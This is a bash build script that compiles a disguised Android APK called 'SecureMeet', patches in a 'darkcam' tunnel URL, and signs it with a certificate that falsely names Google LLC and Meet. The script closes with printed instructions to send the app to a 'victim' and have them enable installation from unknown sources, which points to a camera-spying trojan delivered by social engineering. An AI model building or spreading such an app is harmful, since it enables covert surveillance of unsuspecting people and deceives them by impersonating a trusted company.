#!/bin/bash
# Usage: ./build.sh https://DARKCAM_TUNNEL_URL
# Output: dist/SecureMeet.apk

set -e
DIR="$(cd "$(dirname "$0")" && pwd)"
URL="${1:?Usage: ./build.sh <darkcam-url>}"

ANDROID_JAR="/usr/lib/android-sdk/platforms/android-23/android.jar"
AAPT="/usr/lib/android-sdk/build-tools/29.0.3/aapt"
APKSIGNER="/usr/lib/android-sdk/build-tools/29.0.3/apksigner"
D8_JAR="/tmp/d8.jar"
KEYSTORE="$DIR/securemeet.keystore"

mkdir -p "$DIR/dist" "$DIR/gen" "$DIR/obj" "$DIR/bin"

# ── 1. Patch target URL into source ──────────────────────────────────────────
mkdir -p "$DIR/obj/com/securemeet/app"
sed "s|REPLACE_TARGET_URL|$URL|g" \
  "$DIR/src/com/securemeet/app/MainActivity.java" \
  > "$DIR/obj/com/securemeet/app/MainActivity.java"
echo "[*] URL patched: $URL"

# ── 2. Generate R.java ────────────────────────────────────────────────────────
$AAPT package -f -m \
  -J "$DIR/gen" \
  -M "$DIR/AndroidManifest.xml" \
  -S "$DIR/res" \
  -I "$ANDROID_JAR"
echo "[*] R.java generated"

# ── 3. Compile Java ───────────────────────────────────────────────────────────
javac -source 8 -target 8 \
  -cp "$ANDROID_JAR" \
  -d "$DIR/obj/classes" \
  "$DIR/gen/com/securemeet/app/R.java" \
  "$DIR/obj/com/securemeet/app/MainActivity.java"
echo "[*] Java compiled"

# ── 4. DEX conversion ────────────────────────────────────────────────────────
java -cp "$D8_JAR" com.android.tools.r8.D8 \
  --min-api 23 \
  --lib "$ANDROID_JAR" \
  --output "$DIR/bin" \
  $(find "$DIR/obj/classes" -name "*.class")
echo "[*] DEX created"

# ── 5. Package APK ────────────────────────────────────────────────────────────
$AAPT package -f \
  -M "$DIR/AndroidManifest.xml" \
  -S "$DIR/res" \
  -I "$ANDROID_JAR" \
  -F "$DIR/bin/unsigned.apk" \
  "$DIR/bin"
echo "[*] APK packaged"

# ── 6. Generate keystore (first run only) ─────────────────────────────────────
if [ ! -f "$KEYSTORE" ]; then
  keytool -genkeypair -v \
    -keystore "$KEYSTORE" \
    -alias securemeet \
    -keyalg RSA -keysize 2048 \
    -validity 10000 \
    -dname "CN=Google LLC, OU=Meet, O=Google, L=Mountain View, ST=CA, C=US" \
    -storepass securemeet123 \
    -keypass securemeet123 2>/dev/null
  echo "[*] Keystore generated"
fi

# ── 7. Sign APK ───────────────────────────────────────────────────────────────
$APKSIGNER sign \
  --ks "$KEYSTORE" \
  --ks-pass pass:securemeet123 \
  --ks-key-alias securemeet \
  --key-pass pass:securemeet123 \
  --out "$DIR/dist/SecureMeet.apk" \
  "$DIR/bin/unsigned.apk"
echo ""
echo "[+] Build complete → android/dist/SecureMeet.apk"
ls -lh "$DIR/dist/SecureMeet.apk"
echo ""
echo "Send SecureMeet.apk to victim (Android)"
echo "Victim: Settings → Unknown sources → ON → Install"
